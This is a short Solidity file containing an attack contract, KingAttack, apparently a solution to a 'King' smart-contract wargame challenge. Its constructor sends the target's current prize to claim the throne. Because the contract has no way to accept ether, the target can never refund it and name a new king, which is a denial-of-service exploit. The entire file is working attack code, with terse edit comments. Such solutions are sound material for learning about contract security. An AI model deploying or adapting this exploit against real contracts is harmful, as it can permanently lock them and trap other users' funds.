// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IKing { // 1) change interface name

    function prize() external view returns (uint256);
    function owner() external view returns (address);
    function _king() external view returns (address);
}

contract KingAttack { // 2) change nameattck

    constructor(IKing kingInstance) payable {

        (bool success,) = address(kingInstance).call{value: kingInstance.prize()}("");
        require(success);
    }
}
